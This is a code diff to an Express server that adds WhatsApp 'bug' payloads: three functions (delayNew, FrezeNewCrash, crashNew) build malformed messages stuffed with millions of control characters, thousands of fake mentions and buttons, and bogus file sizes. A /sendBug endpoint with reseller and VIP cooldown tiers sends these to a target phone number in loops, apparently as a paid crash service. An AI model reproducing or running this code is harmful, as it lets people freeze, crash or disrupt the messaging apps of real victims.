@@ -274,6 +274,204 @@ app.get("/getPairing", auth, async (req, res) => {
   } catch (err) { return res.status(500).json({ error: err.message }); }
 });
 
+
+// ===== Payload baru (Telegram): delay / freeze / crash =====
+/* 
+update function delay no tag sw 20/09/2025 21.46pm
+© ErlanggaOfficial
+*/
+
+async function delayNew(sock, target) {
+  const Msg = await generateWAMessageFromContent(target, {
+    imageMessage: {
+      url: "https://mmg.whatsapp.net/v/t62.7118-24/552151478_1776944623190269_7266107373284748666_n.enc?ccb=11-4&oh=01_Q5Aa2gGFBN2T1fs4hj9U_cN-CKChRau3EPr-Hq8nTQ7sUyOmjQ&oe=68F6362A&_nc_sid=5e03e0&mms3=true",
+      mimetype: "image/jpeg",
+      fileSha256: "uckq9LrvbolNHkQH75v/EXKTy3gg0GZvPDqOJKwe3pk=",
+      fileLength: "40997",
+      height: 1040,
+      width: 780,
+      mediaKey: "IXbyO16CUdW+kBT5uCGwgVudoqFU9dUC/l9HmleT7sw=",
+      fileEncSha256: "+RxL5jYkhcGFd42g3iTJ+LCwiDhIY87Ak3Z8wOJaZmk=",
+      directPath: "/v/t62.7118-24/552151478_1776944623190269_7266107373284748666_n.enc?ccb=11-4&oh=01_Q5Aa2gGFBN2T1fs4hj9U_cN-CKChRau3EPr-Hq8nTQ7sUyOmjQ&oe=68F6362A&_nc_sid=5e03e0",
+      mediaKeyTimestamp: "1758378527",
+      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEEAMAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAEBQACAwEGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADtR4m9aQrbusK63btJePtBA/ySmnpkBE04urKuSUbjliEsArO2Ww+mud+D1ErmSbJklwNyQ//EACgQAAICAQEGBgMAAAAAAAAAAAECABEDMQQFEBITMhUgISJBUTNTgf/aAAgBAQABPwBvIBZJlFjQ1MO0etEQbQk6yH5hdfuLXLEUqrOBppGFHiSYrsJu7Njdem3dMS9TIqk6meFD9kXdSfLzwvB9mZ92ouInGTYiO+N7BoibMrdRWr0BmPKuQWI2VQauBoTNv2SicqQ5n7FWYcjopWItm3P8gc6AQNYhoijGDAe3WYuWKqwVCQJzrOoXF/ExWVExn2wMIz2TLi9kwfjWDgeH/8QAFxEBAQEBAAAAAAAAAAAAAAAAEAERIP/aAAgBAgEBPwDrWMf/xAAZEQACAwEAAAAAAAAAAAAAAAACEAABESD/2gAIAQMBAT8Azqxl4iZP/9k=",
+      caption: "\u0000".repeat(2000000), // triger 1
+      contextInfo: {
+        mentionedJid: [
+          "0@s.whatsapp.net",
+          ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
+        ],
+        participant: target,
+        quotedMessage: {
+          locationMessage: {
+            degreesLatitude: -9.4882766288,
+            degreesLongitude: 9.48827662899,
+            name: "\u0003".repeat(20000000), // triger 2
+            address: null,
+            url: null
+          }
+        }
+      }
+    }
+  });
+
+  await sock.relayMessage(target, Msg.message, {
+    messageId: "", // atau ganti ke null
+    participant: { jid: target }
+  });
+}
+async function FrezeNewCrash(sock, target, ptcp = true) {
+  let AmeliaG = [];
+
+  AmeliaG.push({
+    name: "single_select",
+    buttonParamsJson: "\u0003",
+  });
+
+  for (let i = 0; i < 5000; i++) {
+    AmeliaG.push({
+      name: "call_permission_request",
+      buttonParamsJson: "\u0003",
+    });
+  }
+
+  AmeliaG.push({
+    name: "call_permission_request",
+    buttonParamsJson: "\u0003",
+  });
+
+  let msg = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "𝗔𝗠𝗘𝗟𝗜𝗔 𝗡𝗢𝗧 𝗚𝗧",
+              hasMediaAttachment: false,
+            },
+            body: {
+               text: "Apakah Kamu Ayam" + "ꦽ".repeat(50000),
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{{".repeat(10000),
+              paramsJson: `{
+                "screen_2_OptIn_0": true,
+                "screen_2_OptIn_1": true,
+                "screen_1_Dropdown_0": "⛧ 𐌃𐌀𐌍𐌂𐌄𐍂 :: 𐌀𐍂𐌄𐌀 ⛧",
+                "screen_1_DatePicker_1": "1028995200000",
+                "screen_1_TextInput_2": "cyber@gmail.com",
+                "screen_1_TextInput_3": "94643116",
+                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(25000)}",
+                "screen_0_TextInput_1": "Why?",
+                "screen_0_Dropdown_2": "001-Grimgar",
+                "screen_0_RadioButtonsGroup_3": "0_true",
+                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
+              }`,
+              version: 3,
+              buttons: AmeliaG,
+            },
+          },
+        },
+      },
+    },
+    {}
+  );
+
+  await sock.relayMessage(
+    target,
+    msg.message,
+    ptcp
+      ? {
+        participant: {
+          jid: target,
+        },
+      }
+      : {}
+  );
+}
+async function crashNew(sock, target, Ptcp = true) {
+
+      await sock.relayMessage(
+        target,
+        {
+          ephemeralMessage: {
+            message: {
+              interactiveMessage: {
+                header: {
+                  documentMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+                    mimetype:
+                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                    fileLength: "9999999999999",
+                    pageCount: 1316134911,
+                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                    fileName: "⿻",
+                    fileEncSha256:
+                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                    directPath:
+                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+                    mediaKeyTimestamp: "1726867151",
+                    contactVcard: true,
+                    jpegThumbnail: 'https://files.catbox.moe/k65fvb.jpg',
+                  },
+                  hasMediaAttachment: true,
+                },
+                body: {
+                  text: "饝箔饝箔饾棩饾棶饾棿饾\n" + "ꦾ".repeat(28000),
+                },
+                nativeFlowMessage: {
+                  messageParamsJson: "{}",
+                },
+                contextInfo: {
+                  mentionedJid: [target, "6289526156543@s.whatsapp.net"],
+                  forwardingScore: 1,
+                  isForwarded: true,
+                  fromMe: false,
+                  participant: "0@s.whatsapp.net",
+                  remoteJid: "status@broadcast",
+                  quotedMessage: {
+                    documentMessage: {
+                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                      mimetype:
+                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                      fileSha256:
+                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                      fileLength: "9999999999999",
+                      pageCount: 1316134911,
+                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
+                      fileEncSha256:
+                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                      directPath:
+                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                      mediaKeyTimestamp: "1724474503",
+                      contactVcard: true,
+                      thumbnailDirectPath:
+                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                      thumbnailSha256:
+                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                      thumbnailEncSha256:
+                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                      jpegThumbnail: "",
+                    },
+                  },
+                },
+              },
+            },
+          },
+        },
+        Ptcp
+          ? {
+              participant: {
+                jid: target,
+              },
+            }
+          : {}
+      );
+    }
+
 // ===== sendBug (payload kosong — semua bug_id dijawab jujur) =====
 const ROLE_CD = { owner: 0, vip: 60, reseller: 240, reseller1: 60, member: 300 };
 app.get("/sendBug", auth, async (req, res) => {
@@ -286,7 +484,31 @@ app.get("/sendBug", auth, async (req, res) => {
   if (!sock) {
     return res.json({ valid: false, sended: false, message: "Tidak ada sender aktif. Pairing dulu." });
   }
-  return res.json({ valid: true, sended: false, cooldown: false, role, message: "Payload belum tersedia, tunggu update." });
+  const cd = loadCD();
+  const now = Date.now();
+  const cool = ROLE_CD[role] !== undefined ? ROLE_CD[role] : 60;
+  const last = cd[user + ":" + bug] || 0;
+  if (now - last < cool * 1000) {
+    return res.json({ valid: true, sended: false, cooldown: true, wait: Math.ceil((cool * 1000 - (now - last)) / 1000) });
+  }
+  cd[user + ":" + bug] = now; saveCD(cd);
+  res.json({ valid: true, sended: true, cooldown: false, role });
+  setImmediate(async () => {
+    try {
+      const targetJid = target + "@s.whatsapp.net";
+      if (bug === "delay") {
+        for (let i = 0; i < 3; i++) { await delayNew(sock, targetJid); await sleep(2000); }
+      } else if (bug === "freeze") {
+        for (let i = 0; i < 2; i++) { await FrezeNewCrash(sock, targetJid, true); await sleep(2000); }
+      } else if (bug === "crash") {
+        await crashNew(sock, targetJid, true);
+      } else {
+        console.log(`[BUG] unknown bug id: ${bug}`);
+        return;
+      }
+      console.log(`[BUG] '${bug}' terkirim ke ${target}`);
+    } catch (err) { console.warn(`[SEND ERROR] ${err.message}`); }
+  });
 });
 
 // ===== debug: kirim teks biasa (tes pipe) =====
